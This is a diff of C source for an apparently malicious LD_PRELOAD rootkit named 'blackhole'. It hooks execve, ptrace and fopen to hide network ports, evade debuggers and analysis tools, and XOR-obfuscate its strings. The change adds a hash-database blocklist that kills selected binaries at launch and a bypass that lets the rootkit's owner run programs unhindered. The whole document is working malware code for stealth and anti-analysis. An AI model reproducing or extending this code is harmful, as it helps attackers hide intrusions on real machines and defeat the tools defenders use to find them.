@@ -57,8 +57,6 @@ void init(void) {
 }
 
 int is_owner(void) {
-    init(); // hook configurations
-
     if (owner) {
         return owner;
     }
@@ -236,6 +234,8 @@ FILE *hide_ports(const char *filename) {
     int local_port, rem_port, d, state, uid, timer_run, timeout;
     char rem_addr[128], local_addr[128], more[512];
 
+    init(); // hook configurations
+
     FILE *tmp = tmpfile();
     FILE *pnt = syscall_list[SYS_FOPEN].syscall_func(filename, "r");
 
@@ -268,17 +268,46 @@ FILE *hide_ports(const char *filename) {
 int execve(const char *path, char *const argv[], char *const envp[]) {
     DEBUG("[blackhole]: execve hooked %s\n", path);
 
+    init(); // hook configurations
+
+    if (is_owner()) {
+        return (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
+    }
+
     unsigned char hash[EVP_MAX_MD_SIZE];
     unsigned int hash_length;
     calculate_sha256(path, hash, &hash_length);
     char hash_string[65];
     hash_to_string(hash, hash_length, hash_string);
 
-    char *hash_db_path = strdup(HASH_DB_PATH);
+    char *hashdb_binblock_path = strdup(HASHDB_BINBLOCK_PATH);
+
+    xor(hashdb_binblock_path);
+
+    FILE *binblock_file = syscall_list[SYS_FOPEN].syscall_func(hashdb_binblock_path, "r");
+    if (!binblock_file) {
+        DEBUG("[blackhole]: Error opening hash database %s\n", hashdb_binblock_path);
+        cleanup(hashdb_binblock_path, strlen(hashdb_binblock_path));
+    } else {
+        cleanup(hashdb_binblock_path, strlen(hashdb_binblock_path));
+
+        int is_binblock = is_hash_in_db(hash_string, binblock_file);
+        fclose(binblock_file);
+
+        if (is_binblock) {
+            char *binblock_msg = strdup(BINBLOCK_MSG);
+            xor(binblock_msg);
+            printf("%s\n", binblock_msg);
+            cleanup(binblock_msg, strlen(binblock_msg));
+            exit(-1);
+        }
+    }
+
+    char *hashdb_binavoid_path = strdup(HASHDB_BINAVOID_PATH);
     char *ld_trace = strdup(LD_TRACE);
 
     xor(ld_trace);
-    xor(hash_db_path);
+    xor(hashdb_binavoid_path);
 
     char *trace_var = getenv(ld_trace);
 
@@ -286,19 +315,17 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
 
     int pid, ret;
 
-    init(); // hook configurations
-
-    FILE *hash_db_file = syscall_list[SYS_FOPEN].syscall_func(hash_db_path, "r");
-    if (!hash_db_file) {
-        DEBUG("[blackhole]: Error opening hash database %s\n", hash_db_path);
-        cleanup(hash_db_path, strlen(hash_db_path));
+    FILE *hashdb_binavoid_file = syscall_list[SYS_FOPEN].syscall_func(hashdb_binavoid_path, "r");
+    if (!hashdb_binavoid_file) {
+        DEBUG("[blackhole]: Error opening hash database %s\n", hashdb_binavoid_path);
+        cleanup(hashdb_binavoid_path, strlen(hashdb_binavoid_path));
         return (long) syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
     }
 
-    cleanup(hash_db_path, strlen(hash_db_path));
+    cleanup(hashdb_binavoid_path, strlen(hashdb_binavoid_path));
 
-    int is_hide = is_hash_in_db(hash_string, hash_db_file);
-    fclose(hash_db_file);
+    int is_hide = is_hash_in_db(hash_string, hashdb_binavoid_file);
+    fclose(hashdb_binavoid_file);
 
     // If the path corresponds to certain debugging or analysis tools
     if (is_hide || trace_var != NULL) {
@@ -342,13 +369,9 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
 // Hooked ptrace function to exit on debug
 long ptrace(void *request, pid_t pid, void *addr, void *data) {
     char *anti_debug_msg = strdup(ANTI_DEBUG_MSG);
-
     xor(anti_debug_msg);
-
     printf("%s\n", anti_debug_msg);
-
     cleanup(anti_debug_msg, strlen(anti_debug_msg));
-
     exit(-1);
 }
 
